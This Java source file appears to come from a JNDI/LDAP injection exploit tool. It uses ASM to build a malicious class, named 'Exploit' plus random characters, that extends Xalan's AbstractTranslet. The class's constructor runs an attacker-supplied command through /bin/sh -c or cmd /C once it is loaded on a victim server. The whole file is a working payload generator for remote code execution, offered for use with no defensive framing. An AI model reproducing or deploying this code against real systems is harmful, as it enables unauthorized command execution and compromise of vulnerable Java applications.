package com.feihong.ldap.template;

import com.feihong.ldap.utils.Cache;
import com.feihong.ldap.utils.Util;
import org.objectweb.asm.*;
import static org.objectweb.asm.Opcodes.*;

public class CommandTemplate implements Template{
    private String className;
    private byte[] bytes;
    private String cmd;

    public CommandTemplate(String cmd){
        this.cmd = cmd;
        this.className = "Exploit" + Util.getRandomString();

        generate();
    }

    public CommandTemplate(String cmd, String className){
        this.cmd = cmd;
        this.className = className;

        generate();
    }

    public void cache(){
        Cache.set(className, bytes);
    }

    public String getClassName(){
        return className;
    }

    public byte[] getBytes(){
        return bytes;
    }

    public void generate(){
        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;
        AnnotationVisitor av0;

        cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", null);

        {
            fv = cw.visitField(ACC_PRIVATE + ACC_STATIC, "cmd", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/io/IOException");
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet", "<init>", "()V", false);
            mv.visitFieldInsn(GETSTATIC, "java/io/File", "separator", "Ljava/lang/String;");
            mv.visitLdcInsn("/");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z", false);
            Label l3 = new Label();
            mv.visitJumpInsn(IFEQ, l3);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("/bin/sh");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("-c");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitFieldInsn(GETSTATIC, className, "cmd", "Ljava/lang/String;");
            mv.visitInsn(AASTORE);
            mv.visitVarInsn(ASTORE, 1);
            mv.visitJumpInsn(GOTO, l0);
            mv.visitLabel(l3);
            mv.visitFrame(Opcodes.F_FULL, 1, new Object[] {className}, 0, new Object[] {});
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("cmd");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("/C");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitFieldInsn(GETSTATIC, className, "cmd", "Ljava/lang/String;");
            mv.visitInsn(AASTORE);
            mv.visitVarInsn(ASTORE, 1);
            mv.visitLabel(l0);
            mv.visitFrame(Opcodes.F_APPEND,1, new Object[] {"[Ljava/lang/String;"}, 0, null);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            mv.visitInsn(POP);
            mv.visitLabel(l1);
            Label l4 = new Label();
            mv.visitJumpInsn(GOTO, l4);
            mv.visitLabel(l2);
            mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/io/IOException"});
            mv.visitVarInsn(ASTORE, 2);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/IOException", "printStackTrace", "()V", false);
            mv.visitLabel(l4);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitInsn(RETURN);
            mv.visitMaxs(4, 3);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[] { "com/sun/org/apache/xalan/internal/xsltc/TransletException" });
            mv.visitCode();
            mv.visitInsn(RETURN);
            mv.visitMaxs(0, 3);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "transform", "(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V", null, new String[] { "com/sun/org/apache/xalan/internal/xsltc/TransletException" });
            mv.visitCode();
            mv.visitInsn(RETURN);
            mv.visitMaxs(0, 4);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
            mv.visitCode();
            mv.visitLdcInsn(cmd);
            mv.visitFieldInsn(PUTSTATIC, className, "cmd", "Ljava/lang/String;");
            mv.visitInsn(RETURN);
            mv.visitMaxs(1, 0);
            mv.visitEnd();
        }
        cw.visitEnd();
        bytes = cw.toByteArray();
    }
}
